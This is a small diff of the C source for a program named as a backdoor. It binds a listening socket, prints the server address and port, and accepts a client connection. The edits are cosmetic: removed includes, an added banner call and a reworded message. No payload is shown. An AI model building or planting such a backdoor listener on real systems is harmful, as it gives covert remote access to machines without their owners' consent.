@@ -1,15 +1,11 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <errno.h>
 #include <netinet/in.h>
-#include <sys/socket.h>
-#include <sys/types.h>
 #include <arpa/inet.h>
 
 #include "backdoor.h"
 
 int main(int argc, char *argv[]){
+
+    show_banner();
 
     struct sockaddr_in backdoor;
     struct sockaddr_in client;
@@ -33,19 +29,17 @@ int main(int argc, char *argv[]){
         exit(1);
     }
 
-    printf("[+]Bind successfully created\n");
+    printf("[+]Successfully created bind\n");
  
     if(listen(sockfd_server, SERVER_BACKLOG)){
         perror("listen");
         exit(1);        
     }
-
     
     printf("[+]listening...\n");
     printf("[+]Server: %s\n", SERVER_ADDR);
     printf("[+]Port: %d\n", SERVER_PORT);
     
-
     if((sockfd_client = accept(sockfd_server, (struct sockaddr *) &client, &size)) < 0){
         perror("socket");
         exit(1);
